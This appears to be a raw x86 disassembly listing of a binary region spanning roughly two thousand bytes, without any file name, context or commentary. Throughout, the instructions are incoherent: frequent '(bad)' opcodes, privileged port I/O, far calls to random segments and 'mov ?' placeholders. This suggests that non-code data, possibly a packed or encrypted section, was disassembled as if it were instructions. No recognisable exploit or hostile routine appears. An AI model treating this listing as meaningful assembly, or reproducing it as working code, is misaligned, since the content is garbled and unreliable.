  413e26:	or     eax,DWORD PTR [ebx+edx*4]
  413e29:	pop    esp
  413e2a:	mov    ah,0x42
  413e2c:	out    dx,al
  413e2d:	test   eax,0x94ca9a31
  413e32:	popf   
  413e33:	xchg   ebp,eax
  413e34:	and    al,0x86
  413e36:	sar    ebx,1
  413e38:	shl    DWORD PTR [edi],cl
  413e3a:	retf   0xc94c
  413e3d:	adc    ecx,DWORD PTR [edx]
  413e3f:	xchg   BYTE PTR [bp+si+0x4d],al
  413e43:	or     DWORD PTR [edx],eax
  413e45:	inc    eax
  413e46:	add    eax,0x83b70007
  413e4b:	inc    edx
  413e4c:	test   BYTE PTR [esi-0x18],al
  413e4f:	pop    es
  413e50:	or     edi,DWORD PTR [edx-0x46]
  413e53:	call   0xdd6a:0xa00e0086
  413e5a:	shl    DWORD PTR [eax+0x13],0x76
  413e5e:	ja     0x413eb8
  413e60:	jae    0x413def
  413e62:	pop    ds
  413e63:	int3   
  413e64:	mov    ebx,esp
  413e66:	mov    ?,WORD PTR [ebp-0xebcbf83]
  413e6c:	jb     0x413e9c
  413e6e:	cmp    al,0x66
  413e70:	inc    esp
  413e71:	pop    ds
  413e72:	loopne 0x413e11
  413e74:	xor    al,0xd4
  413e76:	mov    ch,0x1d
  413e78:	dec    edx
  413e79:	pop    esp
  413e7a:	cli    
  413e7b:	pop    ebp
  413e7c:	and    eax,0xbbce49e9
  413e81:	mov    esi,edi
  413e83:	mov    ds:0xa4943688,eax
  413e88:	mov    DWORD PTR [edi+eiz*2-0x1930427b],edx
  413e8f:	pop    ss
  413e90:	cdq    
  413e91:	cmp    eax,0x27c1d839
  413e96:	add    BYTE PTR [ecx-0x321bb513],dl
  413e9c:	xchg   edi,eax
  413e9d:	adc    al,0x29
  413e9f:	int3   
  413ea0:	out    0xef,al
  413ea2:	lods   eax,DWORD PTR ds:[esi]
  413ea3:	xchg   edi,eax
  413ea4:	gs (bad) 
  413ea6:	mov    esi,0xd3c3a994
  413eac:	mov    ebx,0xfb06340b
  413eb1:	mov    edi,0xd2974f9c
  413eb6:	popa   
  413eb7:	iret   
  413eb8:	fs scas al,BYTE PTR es:[edi]
  413eba:	(bad)  
  413ebb:	adc    DWORD PTR [edi],eax
  413ebd:	xor    DWORD PTR [ecx+0x388074e4],0xd6d9b83c
  413ec7:	inc    ebx
  413ec8:	jnp    0x413e76
  413eca:	sahf   
  413ecb:	fsubr  QWORD PTR [eax]
  413ecd:	cli    
  413ece:	mov    al,BYTE PTR [esp+ecx*1]
  413ed1:	cmc    
  413ed2:	mov    cl,0x92
  413ed4:	cld    
  413ed5:	idiv   BYTE PTR [ebp+ebx*8+0x1d25aeb9]
  413edc:	(bad)  
  413edd:	pop    edi
  413ede:	scas   al,BYTE PTR es:[edi]
  413edf:	out    0xba,eax
  413ee1:	cmp    ch,BYTE PTR [ebx-0x5c]
  413ee4:	mov    esp,0xc03d2a7d
  413ee9:	jl     0x413f0a
  413eeb:	and    DWORD PTR [ebx-0x76],eax
  413eee:	add    DWORD PTR ss:[ecx-0x48ec4c5a],ebx
  413ef5:	push   cs
  413ef6:	add    DWORD PTR [edi],ebx
  413ef8:	xchg   ebx,eax
  413ef9:	(bad)  
  413efa:	les    ebx,FWORD PTR [edx+ecx*1]
  413efd:	pop    esi
  413efe:	and    DWORD PTR [eax+esi*1],edi
  413f01:	jp     0x413eaf
  413f03:	lods   eax,DWORD PTR ds:[esi]
  413f04:	cmp    ebp,DWORD PTR [ebx+0x70]
  413f07:	mov    edi,0x4274c8c1
  413f0c:	push   ebx
  413f0d:	int3   
  413f0e:	inc    edi
  413f0f:	mov    ds:0xfddaa1ae,eax
  413f14:	xchg   DWORD PTR [edx+0x6bce3a9a],edi
  413f1a:	pop    es
  413f1b:	lock mov edi,edx
  413f1e:	inc    edi
  413f1f:	add    eax,0x9699f86b
  413f24:	jge    0x413eaa
  413f26:	inc    edi
  413f27:	sbb    eax,0xc70da3e9
  413f2c:	mov    edi,0x22922b59
  413f31:	or     ebx,DWORD PTR [esi+0x73]
  413f34:	outs   dx,DWORD PTR ds:[esi]
  413f35:	fisubr WORD PTR [edi-0x4569794]
  413f3b:	or     DWORD PTR [edi+0x1b],edx
  413f3e:	sub    al,0x35
  413f40:	add    ebx,0xc6f2a1d5
  413f46:	or     eax,0xcff2e3c5
  413f4b:	es js  0x413f32
  413f4e:	pop    esi
  413f4f:	imul   ebp,DWORD PTR [esi],0x44106324
  413f55:	iret   
  413f56:	adc    al,0xd4
  413f58:	push   esi
  413f59:	fsub   DWORD PTR [eax-0x68]
  413f5c:	mov    cl,0xb3
  413f5e:	adc    al,0x66
  413f60:	add    al,0x84
  413f62:	push   0x2e
  413f64:	sub    ch,BYTE PTR [esi]
  413f66:	adc    esp,0x3d53b89
  413f6c:	mov    bh,0x32
  413f6e:	xchg   BYTE PTR [eax-0x67],bh
  413f71:	mov    eax,ds:0xf11fcb86
  413f76:	icebp  
  413f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f78:	pop    ds
  413f79:	retf   
  413f7a:	mov    DWORD PTR [ebx],eax
  413f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f7d:	mov    DWORD PTR ds:0x9e6734de,eax
  413f83:	cmp    BYTE PTR [ebx+eiz*4+0x4311211c],bh
  413f8a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413f8c:	push   eax
  413f8d:	push   ecx
  413f8e:	mov    ecx,0xdfd7220b
  413f93:	retf   0xf4b0
  413f96:	je     0x413f2a
  413f98:	outs   dx,BYTE PTR ds:[esi]
  413f99:	fimul  DWORD PTR [eax-0x7d79a631]
  413f9f:	sbb    eax,0xbf4f8532
  413fa4:	pop    ecx
  413fa5:	into   
  413fa6:	mov    DWORD PTR [ebx-0x79],eax
  413fa9:	lahf   
  413faa:	inc    ecx
  413fab:	fucom  st(1)
  413fad:	mov    es,esi
  413faf:	fs pop esp
  413fb1:	or     ah,BYTE PTR [ebx-0x7baa5192]
  413fb7:	push   ecx
  413fb8:	mov    ah,0x6d
  413fba:	cmp    eax,DWORD PTR [ebp+0x3a]
  413fbd:	dec    ebp
  413fbe:	xchg   ebp,eax
  413fbf:	adc    dh,BYTE PTR [edi]
  413fc1:	and    al,0xad
  413fc3:	(bad)  
  413fc4:	mov    ?,WORD PTR [ebx-0x7e]
  413fc7:	mov    dh,0x4e
  413fc9:	mov    ah,0xc4
  413fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fcc:	cwde   
  413fcd:	sub    ax,0x7bf9
  413fd1:	pop    ss
  413fd2:	(bad)  
  413fd3:	pop    ebp
  413fd4:	jae    0x413faf
  413fd6:	sub    al,0x42
  413fd8:	mov    edi,0xcab189dd
  413fdd:	nop
  413fde:	jle    0x413ffd
  413fe0:	lods   eax,DWORD PTR ds:[esi]
  413fe1:	scas   al,BYTE PTR es:[edi]
  413fe2:	sbb    esi,DWORD PTR [esi-0x62]
  413fe5:	clc    
  413fe6:	add    DWORD PTR [edi],0xc88f25fa
  413fec:	mov    cl,0xe4
  413fee:	xchg   edi,eax
  413fef:	retf   
  413ff0:	fs or  eax,0x2638fcc7
  413ff6:	inc    edx
  413ff7:	mov    ecx,ecx
  413ff9:	bound  edx,QWORD PTR [ebx+0x3a]
  413ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ffd:	mov    BYTE PTR [ebp+edi*2-0x580aedc4],bl
  414004:	jl     0x413fc1
  414006:	inc    edi
  414007:	jne    0x414058
  414009:	(bad)  
  41400a:	outs   dx,DWORD PTR ds:[esi]
  41400b:	aad    0x8b
  41400d:	adc    BYTE PTR [edi-0x5e16abc9],ch
  414013:	cmp    ah,ch
  414015:	call   0x8ff5:0x5bd25227
  41401c:	lds    eax,FWORD PTR [esp+edx*8+0x6cdfbd2b]
  414023:	push   esi
  414024:	mov    ds:0xbf63e664,al
  414029:	aad    0x43
  41402b:	push   ebx
  41402c:	mov    al,ds:0x6127faca
  414031:	xchg   esp,eax
  414032:	fiadd  WORD PTR [ecx+0x2abf9fca]
  414038:	mov    edx,0x6ab3d21a
  41403d:	sahf   
  41403e:	mov    bl,0x44
  414040:	shl    BYTE PTR [esi+0x4f],1
  414043:	jns    0x413fd0
  414045:	inc    ebp
  414046:	sar    DWORD PTR [ebp-0x30],0x36
  41404a:	mov    edi,0x70c1b412
  41404f:	add    eax,0x1c6c73cb
  414054:	xor    DWORD PTR [ecx],ecx
  414056:	popf   
  414057:	mov    esi,0x337dbe2b
  41405c:	jne    0x414020
  41405e:	jmp    0x4140b7
  414060:	shr    al,cl
  414062:	jno    0x414094
  414064:	(bad)  
  414065:	dec    esp
  414066:	sbb    dl,dh
  414068:	mov    cl,0xc4
  41406a:	dec    ebp
  41406b:	xor    ah,ch
  41406d:	sub    DWORD PTR [edi-0x51],edx
  414070:	aaa    
  414071:	fnstsw WORD PTR [esi+0x4a]
  414074:	cdq    
  414075:	js     0x4140c1
  414077:	fisttp WORD PTR [edi+0x28a093c6]
  41407d:	dec    eax
  41407e:	xchg   edi,eax
  41407f:	cmp    edi,ebx
  414081:	ret    
  414082:	add    DWORD PTR [eax],edx
  414084:	test   eax,0xdd3450dc
  414089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41408a:	lahf   
  41408b:	pop    ebp
  41408c:	popa   
  41408d:	scas   eax,DWORD PTR es:[edi]
  41408e:	in     al,0x4d
  414090:	pop    eax
  414091:	fwait
  414092:	scas   al,BYTE PTR es:[edi]
  414093:	sub    DWORD PTR [ebx],0x58
  414096:	cmp    edi,esi
  414098:	pop    edi
  414099:	rol    bh,cl
  41409b:	int3   
  41409c:	cli    
  41409d:	mov    dh,0x74
  41409f:	into   
  4140a0:	shl    DWORD PTR [ebx+0x9],cl
  4140a3:	adc    al,0xfc
  4140a5:	test   eax,0xfdad830a
  4140aa:	sti    
  4140ab:	mov    ah,0xdf
  4140ad:	jge    0x414065
  4140af:	ds in  eax,dx
  4140b1:	add    cl,BYTE PTR [edx-0x5461b9cd]
  4140b7:	nop
  4140b8:	enter  0xd08e,0x78
  4140bc:	int3   
  4140bd:	and    edx,DWORD PTR [ebx+0x225c92c]
  4140c3:	iret   
  4140c4:	lahf   
  4140c5:	push   0xffffff9e
  4140c7:	std    
  4140c8:	mov    dh,0xca
  4140ca:	jp     0x4140b9
  4140cc:	pop    es
  4140cd:	mov    dl,0x47
  4140cf:	or     al,0x28
  4140d1:	sbb    ch,BYTE PTR [esi]
  4140d3:	push   edx
  4140d4:	adc    eax,0x81fc72ea
  4140d9:	clc    
  4140da:	push   ss
  4140db:	xchg   ebp,eax
  4140dc:	rcl    BYTE PTR [ecx+0x77],cl
  4140df:	mov    edi,0x5a132d35
  4140e4:	inc    edx
  4140e5:	add    DWORD PTR [edx+0xc],eax
  4140e8:	hlt    
  4140e9:	fistp  WORD PTR [eax]
  4140eb:	loope  0x4140b4
  4140ed:	or     DWORD PTR [ecx],esp
  4140ef:	not    DWORD PTR [esi+eiz*8-0x12]
  4140f3:	lds    ebx,FWORD PTR [eax+0x6f]
  4140f6:	imul   di,WORD PTR [esi-0x772ccbee],0xf9a6
  4140ff:	sahf   
  414100:	arpl   WORD PTR [eax-0x6884bec5],si
  414106:	mov    ecx,0xf43d71b5
  41410b:	dec    esp
  41410c:	stc    
  41410d:	call   0x8d2d:0x8ce0e867
  414114:	xor    al,0x6a
  414116:	xor    dl,ch
  414118:	and    BYTE PTR [ebx],dh
  41411a:	stos   BYTE PTR es:[edi],al
  41411b:	add    edi,DWORD PTR [edx-0x5c]
  41411e:	enter  0xd25c,0x4b
  414122:	arpl   WORD PTR [edi+ebx*2-0x37ce8670],cx
  414129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412a:	jno    0x414142
  41412c:	mov    ebx,0x62ed25d4
  414131:	(bad)  
  414132:	repz or eax,0xbe2c19fd
  414138:	ins    BYTE PTR es:[edi],dx
  414139:	dec    eax
  41413a:	popa   
  41413b:	fadd   QWORD PTR [edx]
  41413d:	ins    DWORD PTR es:[edi],dx
  41413e:	pop    edi
  41413f:	stc    
  414140:	add    DWORD PTR [edi+0x75],esp
  414143:	xchg   esp,eax
  414144:	jg     0x4140ef
  414146:	jmp    0xfc50:0x5e68329c
  41414d:	mov    ch,0x11
  41414f:	call   0x8f3e4b10
  414154:	mov    ch,0x38
  414156:	imul   edx,edi,0x62
  414159:	call   0xf2:0x61c3dbc0
  414160:	mov    DWORD PTR [ecx+0x1a],ecx
  414163:	repz pop eax
  414165:	in     eax,0x1c
  414167:	mov    ebx,DWORD PTR [edi+0x72]
  41416a:	aas    
  41416b:	shl    BYTE PTR [esi],1
  41416d:	push   edx
  41416e:	rol    al,0xd0
  414171:	addr16 dec esp
  414173:	sahf   
  414174:	push   ebx
  414175:	call   0x13ce:0x31af3ca2
  41417c:	push   ecx
  41417d:	sahf   
  41417e:	fdivp  st(5),st
  414180:	lds    edi,FWORD PTR [ebx]
  414182:	mov    eax,0x1030f0a9
  414187:	das    
  414188:	in     al,dx
  414189:	jno    0x4141b8
  41418b:	shr    ebx,1
  41418d:	pop    ebp
  41418e:	addr16 sahf 
  414190:	jg     0x414143
  414192:	cmp    al,0x5b
  414194:	mov    eax,ds:0x58674fc5
  414199:	xchg   edi,eax
  41419a:	cmp    DWORD PTR [esi-0x64dd60f4],0xffffffd3
  4141a1:	sbb    eax,0xdcb9fe76
  4141a6:	jmp    0x414219
  4141a8:	sbb    edi,ebp
  4141aa:	ss repnz push edi
  4141ad:	xchg   esi,eax
  4141ae:	adc    al,0x79
  4141b0:	add    ch,al
  4141b2:	inc    eax
  4141b3:	push   esi
  4141b4:	addr16 loop 0x4141cd
  4141b7:	in     al,0x75
  4141b9:	cwde   
  4141ba:	xlat   BYTE PTR ds:[ebx]
  4141bb:	lea    ecx,[edx+0x20]
  4141be:	inc    esp
  4141bf:	and    eax,0x6d36d543
  4141c4:	loope  0x414172
  4141c6:	addr16 adc al,0xa7
  4141c9:	jg     0x414237
  4141cb:	xchg   BYTE PTR [esi+0xe],cl
  4141ce:	xchg   esp,eax
  4141cf:	push   ss
  4141d0:	test   DWORD PTR [edi],edi
  4141d2:	add    bl,BYTE PTR [edx-0x24]
  4141d5:	xor    edi,DWORD PTR [esi+0x7d]
  4141d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141d9:	(bad)  
  4141da:	ins    DWORD PTR es:[edi],dx
  4141db:	xchg   ebp,eax
  4141dc:	pop    ss
  4141dd:	inc    edi
  4141de:	inc    eax
  4141df:	jmp    0x414185
  4141e1:	jno    0x41421a
  4141e3:	mov    al,ds:0x8d8750f6
  4141e8:	test   DWORD PTR [ecx+ebx*1+0x6a],ebx
  4141ec:	or     BYTE PTR [edi-0x1196622d],cl
  4141f2:	mov    ah,cl
  4141f4:	sub    al,ch
  4141f6:	mov    esi,0xf3841ad1
  4141fb:	pushf  
  4141fc:	mov    ebp,0xb5038134
  414201:	xchg   ebx,eax
  414202:	sar    DWORD PTR [eax],0x26
  414205:	push   eax
  414206:	outs   dx,DWORD PTR ss:[esi]
  414208:	xchg   esp,eax
  414209:	xor    al,BYTE PTR [edi+0x1a745976]
  41420f:	out    dx,eax
  414210:	mov    ebx,0xb3680987
  414215:	fimul  DWORD PTR [esi+edx*8+0x2b]
  414219:	jl     0x414207
  41421b:	fstp   TBYTE PTR [edi+esi*4-0xb]
  41421f:	mov    edi,0x9421ede5
  414224:	push   0xffffffa5
  414226:	xchg   esi,eax
  414227:	stos   BYTE PTR es:[edi],al
  414228:	test   eax,0x2b76f3d5
  41422d:	pop    ecx
  41422e:	fiadd  WORD PTR [ebx-0x17d1acb1]
  414234:	cmc    
  414235:	mov    esi,eax
  414237:	cdq    
  414238:	xchg   ebx,eax
  414239:	sub    DWORD PTR [edx],0xffffffa8
  41423c:	dec    esp
  41423d:	sti    
  41423e:	les    esp,FWORD PTR [edx]
  414240:	sub    cl,bl
  414242:	repz in al,dx
  414244:	(bad)  
  414246:	mov    al,0x37
  414248:	add    ah,BYTE PTR [ebx-0xd]
  41424b:	mov    ebp,0x82a8e5d5
  414250:	ficomp DWORD PTR [esi+edx*2-0x785d58b2]
  414257:	ret    
  414258:	sub    eax,0xd86dabcc
  41425d:	(bad)  
  41425e:	pop    esi
  41425f:	sub    eax,0xe34f2fba
  414264:	and    BYTE PTR [edx],0xd1
  414267:	mov    bl,0x1b
  414269:	sub    ecx,DWORD PTR [esi]
  41426b:	clc    
  41426c:	cli    
  41426d:	(bad)  
  41426e:	out    dx,eax
  41426f:	adc    edx,esi
  414271:	pop    edx
  414272:	loopne 0x4142b8
  414274:	dec    esp
  414275:	aas    
  414276:	dec    ebp
  414277:	add    BYTE PTR [ebx],al
  414279:	cmp    eax,ebx
  41427b:	popa   
  41427c:	or     al,0x24
  41427e:	ins    BYTE PTR es:[edi],dx
  41427f:	neg    BYTE PTR [eax+0x6891dfd4]
  414285:	retf   0xb9a4
  414288:	fld    QWORD PTR [ebx+eiz*4+0x6f18e3e0]
  41428f:	sti    
  414290:	imul   eax,DWORD PTR [eax-0x48527619],0x14f7b81f
  41429a:	sbb    ch,BYTE PTR [edi]
  41429c:	ror    DWORD PTR [esi],0x8f
  41429f:	mov    eax,0xee0c96e7
  4142a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a5:	or     BYTE PTR [edi],ch
  4142a7:	mov    ds:0xec91251d,al
  4142ac:	retf   0x1bfe
  4142af:	jb     0x414281
  4142b1:	sub    esi,DWORD PTR [ebx+0x41a7f3f3]
  4142b7:	mov    ebp,0x4be109ff
  4142bc:	test   eax,0x52098e24
  4142c1:	push   es
  4142c2:	or     esi,esi
  4142c4:	(bad)
  4142c7:	jo     0x4142d3
  4142c9:	add    esp,DWORD PTR [eax]
  4142cb:	test   eax,0x50e05b96
  4142d0:	(bad)  
  4142d1:	repz (bad) 
  4142d3:	out    dx,eax
  4142d4:	cs scas al,BYTE PTR es:[edi]
  4142d6:	xlat   BYTE PTR ds:[ebx]
  4142d7:	xlat   BYTE PTR ds:[ebx]
  4142d8:	fsub   DWORD PTR [esi]
  4142da:	push   ecx
  4142db:	inc    eax
  4142dc:	mov    BYTE PTR [edi-0x2d],bl
  4142df:	sub    esp,DWORD PTR [esi+0x66bb32f4]
  4142e5:	pushf  
  4142e6:	jae    0x41431b
  4142e8:	jl     0x414322
  4142ea:	lock push edx
  4142ec:	nop
  4142ed:	mov    esp,0x5ac876f4
  4142f2:	push   ebx
  4142f3:	jns    0x414346
  4142f5:	push   0x2a
  4142f7:	mov    WORD PTR [edi],?
  4142f9:	aas    
  4142fa:	xchg   ecx,eax
  4142fb:	mov    al,ds:0x855402e
  414300:	fnstcw WORD PTR [ebx+0x67471b80]
  414306:	gs adc dh,cl
  414309:	mov    ch,0x40
  41430b:	xchg   DWORD PTR [edi],ebp
  41430d:	ds cmp eax,0x80bf0e2
  414313:	inc    edx
  414314:	popf   
  414315:	jmp    edi
  414317:	dec    esi
  414318:	mov    eax,0x87cf535d
  41431d:	call   0x5dc7e873
  414322:	fist   WORD PTR [eax+ecx*8-0x4f63e547]
  414329:	cmp    ebx,ecx
  41432b:	dec    edx
  41432c:	shl    cl,0xaa
  41432f:	out    0x2f,eax
  414331:	popa   
  414332:	push   0xf8c376f8
  414337:	pop    ebx
  414338:	xor    DWORD PTR ds:0x1ace38b6,edi
  41433e:	cmc    
  41433f:	xchg   ebp,eax
  414340:	js     0x414333
  414342:	or     al,0x9b
  414344:	idiv   DWORD PTR [eax-0x7e32df14]
  41434a:	popf   
  41434b:	ins    BYTE PTR es:[edi],dx
  41434c:	inc    ebx
  41434d:	btr    DWORD PTR [eax+0x7d],ebx
  414351:	cmp    al,0xcf
  414353:	adc    eax,0xe2b7870
  414358:	mov    ds:0x613f42ea,eax
  41435d:	cld    
  41435e:	add    BYTE PTR [ebx-0x65],dl
  414361:	pop    edx
  414362:	jns    0x4142ee
  414364:	add    DWORD PTR [esi-0x48479559],edx
  41436a:	jecxz  0x4143d2
  41436c:	cmc    
  41436d:	cwde   
  41436e:	xor    al,0x7d
  414370:	add    BYTE PTR [ebp-0x35],0x1c
  414374:	aam    0xf1
  414376:	mov    edx,0xd894db0d
  41437b:	test   eax,0xd11e1cab
  414380:	jbe    0x41431e
  414382:	xchg   esp,eax
  414383:	hlt    
  414384:	sti    
  414385:	ins    BYTE PTR es:[edi],dx
  414386:	inc    edx
  414387:	and    bl,BYTE PTR [esi]
  414389:	push   ebp
  41438a:	inc    edi
  41438b:	in     al,dx
  41438c:	add    eax,0xaa04f111
  414391:	push   esp
  414392:	inc    eax
  414393:	and    edi,ebx
  414395:	popf   
  414396:	cmp    bl,bl
  414398:	cli    
  414399:	ror    ah,0x5e
  41439c:	mov    cl,0x5b
  41439e:	das    
  41439f:	sub    eax,0xb5a92860
  4143a4:	mov    esp,0xca40c00
  4143a9:	imul   eax,esp,0x6d
  4143ac:	push   ebx
  4143ad:	js     0x4143ed
  4143af:	sub    al,0x45
  4143b1:	xchg   esp,eax
  4143b2:	je     0x41439b
  4143b4:	xchg   BYTE PTR [ebx+ebp*4+0x684451e8],dl
  4143bb:	sahf   
  4143bc:	or     ebx,DWORD PTR [ebx+0x35]
  4143bf:	mov    edx,DWORD PTR [ebp+0x4c]
  4143c2:	icebp  
  4143c3:	dec    esp
  4143c4:	lods   al,BYTE PTR ds:[esi]
  4143c5:	sbb    al,0xdf
  4143c7:	cmp    BYTE PTR [ecx-0x83a1b70],bh
  4143cd:	rcl    DWORD PTR [ebx+0x350baf92],1
  4143d3:	adc    ch,bh
  4143d5:	add    ch,al
  4143d7:	imul   edi,DWORD PTR [eax+0x14],0xde9f4f41
  4143de:	and    eax,0xdf11b7c5
  4143e3:	and    BYTE PTR [edx-0x606c1264],al
  4143e9:	pop    esp
  4143ea:	aam    0x89
  4143ec:	mov    ds:0xbe92be1e,al
  4143f1:	xor    al,0xcb
  4143f3:	mov    edx,DWORD PTR [eax+0x62]
  4143f6:	les    ecx,FWORD PTR ds:[eax+0x5]
  4143fa:	pop    ecx
  4143fb:	inc    DWORD PTR [ebp+0x7]
  4143fe:	aad    0x26
  414400:	aam    0xd8
  414402:	lods   eax,DWORD PTR ds:[esi]
  414403:	mov    ?,WORD PTR [eax+eiz*1-0x5f01526c]
  41440a:	retf   0x5c95
  41440d:	addr16 jp 0x41439e
  414410:	test   DWORD PTR [eax+0x6a],0x30334bff
  414417:	inc    esi
  414418:	(bad)  
  414419:	repnz sti 
  41441b:	mov    WORD PTR [edi-0x5c],?
  41441e:	(bad)  
  41441f:	aaa    
  414420:	sbb    ah,BYTE PTR [eax]
  414422:	es mov dl,0xf8
  414425:	push   esp
  414426:	push   eax
  414427:	nop
  414428:	inc    esi
  414429:	push   es
  41442a:	xor    ch,cl
  41442c:	out    dx,eax
  41442d:	xchg   BYTE PTR [eax+0x3a],ch
  414430:	fdiv   st(1),st
  414432:	push   edi
  414433:	shl    BYTE PTR [edx],cl
  414435:	sbb    ecx,0xe61be399
  41443b:	cwde   
  41443c:	mov    ds:0x4d4a4d44,eax
  414441:	adc    dh,BYTE PTR [edi]
  414443:	frstor [ebx+0x18]
  414446:	loope  0x41440e
  414448:	pop    edi
  414449:	and    BYTE PTR [ecx-0x26],0x2c
  41444d:	push   eax
  41444e:	pushf  
  41444f:	and    al,0x58
  414451:	xchg   edx,eax
  414452:	cld    
  414453:	jno    0x4143d7
  414455:	jecxz  0x4144a7
  414457:	stos   DWORD PTR es:[edi],eax
  414458:	push   ebp
  414459:	(bad)  
  41445b:	jnp    0x414494
  41445d:	cdq    
  41445e:	sub    al,0xa6
  414460:	and    esi,DWORD PTR [edx-0x25]
  414463:	jbe    0x4144c1
  414465:	mov    ds:0x4d36bed8,eax
  41446a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41446b:	mov    eax,0x2cf65dda
  414470:	loope  0x4144a4
  414472:	push   ds
  414473:	das    
  414474:	sar    DWORD PTR [esi+0x1b],0x99
  414478:	in     eax,0x1b
  41447a:	add    DWORD PTR [edx+edi*8+0x6f],esp
  41447e:	push   ebp
  41447f:	fadd   QWORD PTR [edi-0x4224f242]
  414485:	pop    es
  414486:	clc    
  414487:	pop    edi
  414488:	retf   0x6e4a
  41448b:	push   ebp
  41448c:	frstor [edi+0x1234a28f]
  414492:	cli    
  414493:	(bad)  
  414494:	sub    bh,BYTE PTR [edi+0x121563f8]
  41449a:	aam    0xac
  41449c:	jmp    0x3747:0xad035353
  4144a3:	push   ecx
  4144a4:	sub    al,0xa7
  4144a6:	jae    0x4144fb
  4144a8:	sub    eax,0x1498635a
  4144ad:	cmp    DWORD PTR [ebp+0x3f],0x97e995dd
  4144b4:	pop    ebp
  4144b5:	sbb    BYTE PTR [ecx-0x416eea58],bh
  4144bb:	repnz out 0x15,al
  4144be:	jnp    0x41449c
  4144c0:	push   ss
  4144c1:	add    DWORD PTR [ecx+0x38022582],eax
  4144c7:	xor    BYTE PTR [edx+edx*8+0x14bb658f],cl
  4144ce:	cs je  0x414484
  4144d1:	jb     0x4144e3
  4144d3:	and    BYTE PTR es:[esi-0xec9e35d],dl
  4144da:	push   edi
  4144db:	int3   
  4144dc:	inc    edi
  4144dd:	and    al,0x51
  4144df:	rcl    BYTE PTR [ebx-0x3e],0x8c
  4144e3:	stc    
  4144e4:	js     0x414563
  4144e6:	xchg   esi,eax
  4144e7:	push   ss
  4144e8:	fild   QWORD PTR [ecx-0x276a715b]
  4144ee:	(bad)  
  4144f0:	mov    ecx,0xc01c0829
  4144f5:	in     eax,dx
  4144f6:	cld    
  4144f7:	mov    eax,ds:0x685fd20a
  4144fc:	inc    ebp
  4144fd:	xor    eax,0x89bedecd
  414502:	nop
  414503:	shl    DWORD PTR [ecx],cl
  414505:	cli    
  414506:	or     DWORD PTR [esi],eax
  414508:	xor    cl,cl
  41450a:	add    dl,BYTE PTR [ebp+0x5]
  41450d:	scas   al,BYTE PTR es:[edi]
  41450e:	xchg   ebx,eax
  41450f:	xor    edi,ebp
  414511:	sub    al,0x3a
  414513:	int3   
  414514:	jo     0x4144e7
  414516:	es push 0xfffb32e1
  41451c:	mov    ds:0xf694675,al
  414521:	inc    ebp
  414522:	daa    
  414523:	inc    DWORD PTR [eax-0x4de72f5c]
  414529:	cmp    eax,0xa93ee868
  41452e:	or     bl,dl
  414530:	scas   al,BYTE PTR es:[edi]
  414531:	push   esp
  414532:	xchg   edi,eax
  414533:	fcmovb st,st(3)
  414535:	mov    cl,0x4c
  414537:	push   edi
  414538:	sbb    ah,BYTE PTR [edx-0x51]
  41453b:	jns    0x41456b
  41453d:	jne    0x41450c
  41453f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414540:	xchg   BYTE PTR [edi],al
  414542:	and    eax,0x287ca897
  414547:	repz mov bl,0x4d
  41454a:	fist   WORD PTR [ebx+0x5b]
  41454d:	pop    ss
  41454e:	dec    esp
  41454f:	pusha  
  414550:	cmc    
  414551:	(bad)  
  414552:	fisttp DWORD PTR [edx+0x3a879a12]
  414558:	jl     0x41452a
  41455a:	push   0xffffffb2
  41455c:	aaa    
  41455d:	or     dl,BYTE PTR [ebx]
  41455f:	or     bl,BYTE PTR [ecx+0x657c6962]
  414565:	mov    al,ds:0xd30ea345
  41456a:	mov    ecx,0x6d31108b
  41456f:	ror    edx,0xb6
  414572:	cli    
  414573:	push   edx
  414574:	dec    edx
  414575:	rcl    dl,1
  414577:	xchg   esi,eax
  414578:	ins    BYTE PTR es:[edi],dx
  414579:	mov    bl,0x53
  41457b:	or     BYTE PTR [edi-0x73c6dd9a],cl
  414581:	jmp    0xb13a:0xb451d899
  414588:	test   ebp,ecx
  41458a:	bound  eax,QWORD PTR [esi+0x4e]
  41458d:	and    ch,dh
  41458f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414590:	loop   0x414515
  414592:	sub    dh,dl
  414594:	shl    bh,1
  414596:	push   ebx
  414597:	cli    
  414598:	cmp    bl,0xcf
  41459b:	jg     0x414590
  41459d:	pop    edi
  41459e:	inc    esi
  41459f:	and    eax,0xfa6418c2
  4145a4:	adc    al,0xeb
  4145a6:	dec    edx
  4145a7:	pusha  
  4145a8:	outs   dx,DWORD PTR ds:[esi]
  4145a9:	(bad)  
  4145aa:	rol    BYTE PTR [ecx],cl
  4145ac:	adc    al,0x76
  4145ae:	sub    eax,0x39d9f47
  4145b3:	mov    WORD PTR [edi-0x2b936a49],ss
  4145b9:	mov    ds:0x85704cc3,al
  4145be:	xor    ah,BYTE PTR [ebp-0x6]
  4145c1:	inc    edi
  4145c2:	aas    
  4145c3:	jle    0x414545
  4145c5:	push   es
  4145c6:	cmp    ecx,DWORD PTR [edi+edx*1]
  4145c9:	sub    eax,0x4975b9cb
  4145ce:	(bad)  
  4145cf:	pop    edi
  4145d0:	inc    esi
  4145d1:	lahf   
  4145d2:	xchg   ebp,eax
  4145d3:	les    ebx,FWORD PTR [ebx]
  4145d5:	test   DWORD PTR [esi],esi
  4145d7:	(bad)  
  4145d8:	cld    
  4145d9:	bound  ebx,QWORD PTR ds:0x44fc2eb0
  4145df:	clc    
  4145e0:	pusha  
  4145e1:	jle    0x41458c
  4145e3:	iret   
  4145e4:	xchg   dl,al
  4145e6:	ficom  WORD PTR [ebp+eiz*1+0x3e]
  4145ea:	cmp    DWORD PTR [esi],esi
  4145ec:	jno    0x4145d6
  4145ee:	gs mov esi,ebp
  4145f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f2:	cli    
  4145f3:	pop    esi
  4145f4:	jne    0x41461d
  4145f6:	hlt    
  4145f7:	jl     0x414672
  4145f9:	dec    ebp
